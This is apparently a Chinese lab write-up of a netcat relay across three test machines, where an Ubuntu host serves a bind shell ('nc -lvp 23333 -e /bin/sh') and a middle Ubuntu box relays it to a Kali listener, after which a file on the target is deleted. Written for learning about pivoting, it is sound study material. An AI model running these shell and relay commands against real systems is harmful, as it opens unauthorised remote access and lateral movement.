ailx10说：这篇是2020年8月之前写的，后来又改过。这篇我搭了三台机器，让两侧不能直接沟通，再用中间的 Ubuntu 把两个 nc 接起来。目标那端先提供 shell，另一端通过中继连过来，最后还做了个简单文件操作，看整条路是不是真的通了。和前一篇只看两端不同，这次得时刻想着哪个端口正在等谁。笔记留下的是指定连接的转接练习，并不是一下搭出通用 SOCKS 代理。把每一跳画出来之后，代理、监听和反弹这些名字才不再只是差不多的印象。

本实验演示指定 TCP 连接的中继，而不是通用 SOCKS 代理。目标端示例是监听 shell，跳板机将连接转接到测试机；网络隔离需结合拓扑核实。

基本环境如下：

- kali rolling：192.168.160.140
- ubuntu18：192.168.160.137
- ubuntu16：192.168.160.136

组网环境如下：

- 实线表示网络联通
- 虚线表示网络断开

![](/notes-assets/ba30548bacd117a145ab.webp)

## 第一步：在kali rolling上操作

- 这里监听自己的23333端口就好了
- 完成第三步，就会自动获得ubuntu16的shell
- 这里可以看到，ubuntu16上有「小黑的缺点.txt」隐私文档

```
nc -lvp 23333
```

![](/notes-assets/671cbdff42a06875aab8.jpg)

## 第二步：在ubuntu16上操作

- 这里就是将ubuntu16的shell通过23333端口弹出去
- 不管谁访问ubuntu16的23333端口，都将获得shell

```
nc -lvp 23333 -e /bin/sh
```

![](/notes-assets/3ea8c694b3cf00ab7175.jpg)

## 第三步：在ubuntu18上操作

- 这里首先获得ubuntu16的shell
- 然后将shell重定向到kali rolling上去
- 这个时候，小黑在kali rolling上就拿到了ubuntu16的shell啦
- 于是，小黑轻松的删除了「小黑的缺点.txt」

```
nc -v 192.168.160.136 23333 -c "nc -v 192.168.160.140 23333"
```

![](/notes-assets/f61b293946ed7c701bc9.jpg)

本篇完～

连通一条通道，不等于具备任意协议的代理能力。这份练习最清楚的用法，是对照每个监听和连接的位置，看看中继具体替谁接上了哪一段。
